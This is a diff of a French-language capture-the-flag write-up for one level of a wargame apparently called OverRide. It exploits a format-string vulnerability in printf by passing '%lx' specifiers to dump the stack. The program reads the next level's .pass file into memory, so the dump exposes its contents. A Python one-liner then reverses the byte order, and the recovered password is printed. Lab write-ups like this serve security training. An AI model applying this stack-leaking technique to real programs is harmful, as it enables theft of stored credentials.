@@ -1,36 +1,48 @@
-Dans ce level nous allons nous d'un printf vunerable au buffer overflow.
-A partir de ce printf nous allons pouvoir lui transmettre comme argument "%x" pour pouvoir afficher
-toute la stack.
+1 --- OBJECTIF
+	Dans ce level nous allons nous d'un printf vunerable au buffer overflow.
+	A partir de ce printf nous allons pouvoir lui transmettre comme argument "%lx" pour pouvoir afficher
+	toute la stack du main dans lequel est stocker le mot de passe du niveau suivant.
 
-printf(&format);
+	0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt> --> printf vunerable
+	0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt>  --> fopen(/home/users/level03/.pass)
+	0x0000000000400901 <+237>:	callq  0x400690 <fread@plt>  --> lecture du .pass
 
+	au debut du programme on peu remarquer qu'il ouvre le fichier .pass et qu'il met son contenu
+	dans un buffer.
 
-stream = fopen("/home/users/level03/.pass", 0x400bb0, 0x400bb0);
-buffer = fread(&ptr, 1, 0x41, stream);
-plus haut dans le programme on peu remarquer qu'il ouvre le fichier .pass et qu'il met son contenu
-dans un buffer.
-En affichant un nombre suffisant d'octect on va pouvoir voir apparaitre le mot de passe
+2 --- UTILISATION DU PRINTF
+	En utilisant le flag %lx cela nous permet d'afficher 8 octects de la stack
+	En utilisant un assesseur pour decaler l'affichage on va pourvoir ce decaler dans la stack.
+	Jusqu'a trouver quelquechose qui ressemble a un flag.
 
-0
-756e505234376848 <-- debut du mot de passe
-45414a3561733951
-377a7143574e6758
-354a35686e475873
-48336750664b394d
-0
+	0
+	756e505234376848 <-- debut du mot de passe
+	45414a3561733951
+	377a7143574e6758
+	354a35686e475873
+	48336750664b394d
+	0
 
+	une fois le mot de passe trouve dans la stack il nous faut reverse chaque bloque d'octect pour avoir le resultat en big endian
 
+	python -c 'print(
+		"\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] +\
+		"\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] +\
+		"\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] +\
+		"\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] +\ 
+		"\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1])'
 
-une fois le mot de passe trouve dans la stack il nous faut reverse chaque bloque d'octect pour avoir le resultat en big endian
+	apres execution cela nous donne:
 
-python -c 'print(
-	"\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] +\
+	Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+	level02@OverRide:~$
+
+3 --- OBTENIR LE TOKEN
+	- chmod 777 . && touch script && chmod 777 script && vim script
+	- `copier coller le contenu du fichier script` puis sauvegarder et quitter
+	- sh script
+	- python -c 'print("\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] +\
 	"\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] +\
 	"\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] +\
-	"\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] +\ 
+	"\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] +\
 	"\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1])'
-
-apres execution cela nous donne:
-
-Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
-level02@OverRide:~$
